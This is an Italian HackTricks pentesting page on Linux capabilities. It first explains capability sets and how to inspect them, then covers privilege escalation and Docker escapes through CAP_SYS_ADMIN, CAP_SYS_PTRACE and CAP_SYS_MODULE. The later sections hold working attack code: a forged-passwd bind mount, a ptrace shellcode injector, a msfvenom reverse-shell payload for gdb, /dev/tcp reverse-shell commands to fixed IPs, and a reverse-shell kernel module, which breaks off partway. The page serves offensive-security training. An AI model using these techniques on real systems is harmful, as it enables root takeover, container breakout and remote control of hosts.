# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Le capabilities di Linux suddividono i **privilegi root in unità più piccole e distinte**, consentendo ai processi di avere un sottoinsieme di privilegi. Questo riduce i rischi evitando di concedere inutilmente privilegi root completi.

### Il problema:

- Gli utenti normali hanno permessi limitati, il che influisce su attività come l'apertura di un network socket, che richiede accesso root.

### Set di capabilities:

1. **Inherited (CapInh)**:

- **Scopo**: Determina le capabilities trasmesse dal processo padre.
- **Funzionalità**: Quando viene creato un nuovo processo, eredita le capabilities del processo padre presenti in questo set. È utile per mantenere determinati privilegi durante la creazione di nuovi processi.
- **Limitazioni**: Un processo non può ottenere capabilities che il processo padre non possedeva.

2. **Effective (CapEff)**:

- **Scopo**: Rappresenta le capabilities effettivamente utilizzate da un processo in un determinato momento.
- **Funzionalità**: È il set di capabilities controllato dal kernel per concedere l'autorizzazione a diverse operazioni. Per i file, questo set può essere un flag che indica se le capabilities consentite del file devono essere considerate effettive.
- **Importanza**: Il set effective è fondamentale per i controlli immediati dei privilegi, poiché agisce come il set attivo di capabilities che un processo può utilizzare.

3. **Permitted (CapPrm)**:

- **Scopo**: Definisce il set massimo di capabilities che un processo può possedere.
- **Funzionalità**: Un processo può elevare una capability dal set permitted al set effective, ottenendo la possibilità di utilizzarla. Può anche rimuovere capabilities dal proprio set permitted.
- **Limite**: Agisce come limite superiore per le capabilities che un processo può avere, assicurando che non superi il suo ambito di privilegi predefinito.

4. **Bounding (CapBnd)**:

- **Scopo**: Stabilisce un limite alle capabilities che un processo può acquisire durante il suo ciclo di vita.
- **Funzionalità**: Anche se un processo possiede una determinata capability nel set inheritable o permitted, non può acquisirla a meno che non sia presente anche nel bounding set.
- **Caso d'uso**: Questo set è particolarmente utile per limitare il potenziale di privilege escalation di un processo, aggiungendo un ulteriore livello di sicurezza.

5. **Ambient (CapAmb)**:
- **Scopo**: Consente di mantenere determinate capabilities attraverso una system call `execve`, che normalmente comporterebbe un reset completo delle capabilities del processo.
- **Funzionalità**: Assicura che i programmi non-SUID privi di file capabilities associate possano conservare determinati privilegi.
- **Limitazioni**: Le capabilities presenti in questo set sono soggette ai vincoli dei set inheritable e permitted, assicurando che non superino i privilegi consentiti al processo.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Per ulteriori informazioni, consulta:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacità di Processi e Binaries

### Capacità dei processi

Per visualizzare le capabilities di un determinato processo, usa il file **status** nella directory /proc. Poiché fornisce maggiori dettagli, limitiamoci alle informazioni relative alle capabilities di Linux.\
Nota che per tutti i processi in esecuzione le informazioni sulle capabilities vengono mantenute per thread, mentre per i binaries nel file system sono memorizzate negli attributi estesi.

Puoi trovare le capabilities definite in /usr/include/linux/capability.h

Puoi trovare le capabilities del processo corrente con `cat /proc/self/status` oppure eseguendo `capsh --print`, e quelle di altri utenti in `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Questo comando dovrebbe restituire 5 righe sulla maggior parte dei sistemi.

- CapInh = Capabilities ereditate
- CapPrm = Capabilities consentite
- CapEff = Capabilities effettive
- CapBnd = Bounding set
- CapAmb = Set di capabilities ambientali
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Questi numeri esadecimali non hanno senso. Utilizzando l'utility `capsh`, possiamo decodificarli nei nomi delle capabilities.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Controlliamo ora le **capabilities** utilizzate da `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Sebbene funzioni, esiste un altro metodo più semplice. Per visualizzare le capabilities di un processo in esecuzione, usa semplicemente lo strumento **getpcaps** seguito dal suo process ID (PID). Puoi anche fornire un elenco di process ID.
```bash
getpcaps 1234
```
Verifichiamo qui le capabilities di `tcpdump` dopo aver assegnato al binario capabilities sufficienti (`cap_net_admin` e `cap_net_raw`) per sniffare la rete (_`tcpdump` è in esecuzione nel processo 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Come puoi vedere, le capabilities indicate corrispondono ai risultati dei 2 modi per ottenere le capabilities di un binary.\
Il tool _getpcaps_ utilizza la system call **capget()** per interrogare le capabilities disponibili per uno specifico thread. Questa system call richiede solo il PID per ottenere ulteriori informazioni.

### Capabilities dei binari

I binari possono avere capabilities utilizzabili durante l'esecuzione. Ad esempio, è molto comune trovare il binary `ping` con la capability `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Puoi **cercare i binari con capabilities** usando:
```bash
getcap -r / 2>/dev/null
```
### Rimozione delle capabilities con capsh

Se rimuoviamo le capabilities CAP*NET_RAW per \_ping*, l'utility ping non dovrebbe più funzionare.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Oltre all’output di _capsh_, anche il comando _tcpdump_ stesso dovrebbe generare un errore.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

L’errore mostra chiaramente che il comando ping non è autorizzato ad aprire un socket ICMP. Ora sappiamo per certo che funziona come previsto.

### Rimuovere le Capabilities

Puoi rimuovere le capabilities di un binary con
```bash
setcap -r </path/to/binary>
```
## Capabilities degli utenti

A quanto pare, **è possibile assegnare capabilities anche agli utenti**. Questo probabilmente significa che ogni processo eseguito dall'utente sarà in grado di utilizzare le capabilities dell'utente.\
Sulla base di [questo](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [questo ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)e [questo ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), alcuni file devono essere configurati per assegnare determinate capabilities a un utente, ma quello che assegna le capabilities a ciascun utente sarà `/etc/security/capability.conf`.\
Esempio di file:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capabilities dell'ambiente

Compilando il seguente programma è possibile **avviare una bash shell all'interno di un ambiente che fornisce capabilities**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
All'interno di **bash eseguito dal binario ambient compilato** è possibile osservare le **nuove capabilities** (un utente normale non avrà alcuna capability nella sezione "current").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Puoi **aggiungere solo le capabilities presenti** sia negli insiemi permitted che inheritable.

### Binaries capability-aware/Capability-dumb

I **binaries capability-aware non utilizzeranno le nuove capabilities** fornite dall'environment, mentre i **binaries capability-dumb le utilizzeranno**, poiché non le rifiuteranno. Questo rende i binaries capability-dumb vulnerabili all'interno di un environment speciale che assegna capabilities ai binaries.

## Capabilities dei service

Per impostazione predefinita, un **service in esecuzione come root avrà assegnate tutte le capabilities**, e in alcune occasioni questo può essere pericoloso.\
Pertanto, un file di **configurazione del service** consente di **specificare** le **capabilities** che si desidera assegnargli, e l'**user** che deve eseguire il service per evitare di eseguire un service con privilegi non necessari:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities nei container Docker

Per impostazione predefinita, Docker assegna alcune capabilities ai container. È molto semplice verificare quali siano eseguendo:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Le capabilities sono utili quando **si desidera limitare i propri processi dopo aver eseguito operazioni privilegiate** (ad esempio, dopo aver configurato chroot e aver eseguito il binding su un socket). Tuttavia, possono essere sfruttate passando loro comandi o argomenti dannosi, che vengono quindi eseguiti come root.

È possibile forzare le capabilities sui programmi usando `setcap` e interrogarle usando `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` significa che stai aggiungendo la capability ("-" la rimuoverebbe) come Effective e Permitted.

Per identificare i programmi in un sistema o in una cartella con delle capability:
```bash
getcap -r / 2>/dev/null
```
### Esempio di exploitation

Nel seguente esempio il binary `/usr/bin/python2.6` risulta vulnerabile a privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** necessarie a `tcpdump` per **consentire a qualsiasi utente di sniffare i pacchetti**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Il caso speciale delle capabilities "vuote"

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Nota che è possibile assegnare set di capabilities vuoti a un file programma e, pertanto, creare un programma set-user-ID-root che modifica il set-user-ID effettivo e salvato del processo che esegue il programma a 0, ma non conferisce alcuna capability a tale processo. In altre parole, se hai un binary che:

1. non è di proprietà di root
2. non ha impostati i bit `SUID`/`SGID`
3. ha un set di capabilities vuoto (ad esempio: `getcap myelf` restituisce `myelf =ep`)

allora **quel binary verrà eseguito come root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** è una capability Linux altamente potente, spesso equiparata a un livello quasi-root per via dei suoi ampi **privilegi amministrativi**, come il mounting dei device o la manipolazione delle funzionalità del kernel. Sebbene sia indispensabile per i container che simulano interi sistemi, **`CAP_SYS_ADMIN` pone notevoli rischi per la sicurezza**, soprattutto negli ambienti containerizzati, a causa del suo potenziale per la privilege escalation e la compromissione del sistema. Pertanto, il suo utilizzo richiede rigorose valutazioni di sicurezza e una gestione prudente, privilegiando fortemente la rimozione di questa capability nei container specifici per le applicazioni, per rispettare il **principle of least privilege** e ridurre al minimo la attack surface.

**Esempio con binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Utilizzando Python è possibile montare un file _passwd_ modificato sopra il file _passwd_ reale:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
E infine esegui il **mount** del file `passwd` modificato su `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
E potrai eseguire **`su` come root** utilizzando la password "password".

**Esempio con environment (Docker breakout)**

Puoi verificare le capabilities abilitate all'interno del container Docker utilizzando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
All'interno dell'output precedente puoi vedere che la capability SYS_ADMIN è abilitata.

- **Mount**

Questo consente al container Docker di **montare il disco dell'host e accedervi liberamente**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Accesso completo**

Nel metodo precedente siamo riusciti ad accedere al disco del docker host.\
Nel caso in cui scopriate che l'host esegue un server **ssh**, potreste **creare un utente all'interno del disco del docker host** e accedervi tramite SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Questo significa che puoi evadere dal container iniettando uno shellcode all'interno di un processo in esecuzione sull'host.** Per accedere ai processi in esecuzione sull'host, il container deve essere eseguito almeno con **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** concede la possibilità di utilizzare le funzionalità di debugging e di tracing delle system call fornite da `ptrace(2)` e le chiamate di cross-memory attach come `process_vm_readv(2)` e `process_vm_writev(2)`. Sebbene sia potente per scopi diagnostici e di monitoraggio, se `CAP_SYS_PTRACE` è abilitato senza misure restrittive come un filtro seccomp su `ptrace(2)`, può compromettere significativamente la sicurezza del sistema. In particolare, può essere sfruttato per aggirare altre restrizioni di sicurezza, soprattutto quelle imposte da seccomp, come dimostrato da [proofs of concept (PoC) come questo](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Esempio con un binario (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Esempio con binary (gdb)**

`gdb` con capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Creare una shellcode con msfvenom da iniettare in memoria tramite gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Esegui il debug di un processo root con gdb e copia-incolla le righe gdb generate in precedenza:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Esempio con ambiente (Docker breakout) - Altro abuso di gdb**

Se **GDB** è installato (oppure puoi installarlo, ad esempio, con `apk add gdb` o `apt install gdb`) puoi **fare il debug di un processo dall'host** e fargli chiamare la funzione `system`. (Questa tecnica richiede anche la capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Non potrai vedere l'output del comando eseguito, ma verrà eseguito da quel processo (quindi ottieni una rev shell).

> [!WARNING]
> Se ricevi l'errore "No symbol "system" in current context.", controlla l'esempio precedente sul caricamento di una shellcode in un programma tramite gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

Puoi verificare le capabilities abilitate all'interno del container Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Elenca i **processi** in esecuzione sull'**host** `ps -eaf`

1. Ottieni l'**architettura** `uname -m`
2. Trova uno **shellcode** per l'architettura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Trova un **programma** per **iniettare** lo **shellcode** nella memoria di un processo ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modifica** lo **shellcode** all'interno del programma e **compilalo** `gcc inject.c -o inject`
5. **Iniettalo** e ottieni la tua **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** consente a un processo di **caricare e scaricare moduli del kernel (le chiamate di sistema `init_module(2)`, `finit_module(2)` e `delete_module(2)`)**, offrendo accesso diretto alle operazioni fondamentali del kernel. Questa capability presenta rischi critici per la sicurezza, poiché consente l'escalation dei privilegi e la compromissione totale del sistema permettendo modifiche al kernel e, di conseguenza, aggirando tutti i meccanismi di sicurezza Linux, inclusi i Linux Security Modules e l'isolamento dei container.
**Ciò significa che puoi** **inserire/rimuovere moduli del kernel nel/dal kernel della macchina host.**

**Esempio con un binario**

Nell'esempio seguente il binario **`python`** dispone di questa capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Per impostazione predefinita, il comando **`modprobe`** verifica la presenza dei file con l’elenco delle dipendenze e dei file map nella directory **`/lib/modules/$(uname -r)`**.\
Per sfruttare questa situazione, creiamo una cartella **lib/modules** falsa:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Quindi **compila il modulo del kernel; puoi trovare 2 esempi qui sotto, quindi copialo in questa cartella:**
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Infine, esegui il codice Python necessario per caricare questo modulo del kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Esempio 2 con binary**

Nel seguente esempio il binary **`kmod`** ha questa capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Il che significa che è possibile utilizzare il comando **`insmod`** per inserire un modulo del kernel. Segui l'esempio seguente per ottenere una **reverse shell** sfruttando questo privilegio.

**Esempio con environment (Docker breakout)**

Puoi verificare le capabilities abilitate all'interno del container Docker utilizzando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Nel precedente output puoi vedere che la capability **SYS_MODULE** è abilitata.

**Crea** il **kernel module** che eseguirà una reverse shell e il **Makefile** per **compilarlo**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

